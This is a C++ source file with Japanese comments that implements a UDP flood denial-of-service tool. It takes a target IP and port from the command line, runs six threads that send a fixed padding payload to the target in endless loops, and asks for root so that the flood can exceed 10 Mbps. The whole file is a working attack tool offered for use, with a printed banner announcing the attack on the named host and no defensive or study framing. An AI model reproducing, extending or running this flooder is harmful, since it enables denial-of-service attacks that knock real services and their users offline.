/*
*  プロキシに通しての実行は出来ないのでご了承ください。
*  もし、プロキシを通したい人がいるならばご自分で改造してください。
*/

#include<cstdio>
#include<cstdlib>
#include<cstring>
#include<netdb.h>
#include<netinet/in.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#include <sys/types.h>
#include <unistd.h>

#include <thread>
using std::thread;

int port{};
const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";

void attack(char* str)
{
    int soc{};
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(soc);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

void attack2(char* str)
{
    int sock{};
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            sock = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(sock);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

void attack3(char* str)
{
    int socks{};
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(str);
    addr.sin_port = htons(port);

    int(*F_sock)(int, int, int) = socket;
    int(*F_close)(int) = close;

    while (true) {
        try {
            //ソケット生成
            socks = (*F_sock)(AF_INET, SOCK_DGRAM, 0);

            //データ送信
            sendto(socks, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));

            //ソケットを閉じる
            (*F_close)(socks);
        }
        catch (...) {
            perror("Error ");
            exit(-1);
        }
    }
}

int main(int argc, char* argv[])
{
    if (getuid() != 0) {
        printf("\n管理者権限じゃないと10Mbps超えなかったから\nsudoを付けて実行をしてね。\n\n");
        return -1;
    }
    struct hostent* he;
    char* str = NULL;

    if (argc < 3) {
        printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
        return -1;
    }

    if ((he = gethostbyname2(argv[1], AF_INET)) == NULL) {
        perror("Error ");
        return -1;
    }

    port = atoi(argv[2]);

    str = he->h_name;

    printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);

    thread t1(attack, str);
    thread t2(attack, str);
    thread t3(attack2, str);
    thread t4(attack2, str);
    thread t5(attack3, str);
    thread t6(attack3, str);

    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();

    return 0;
}
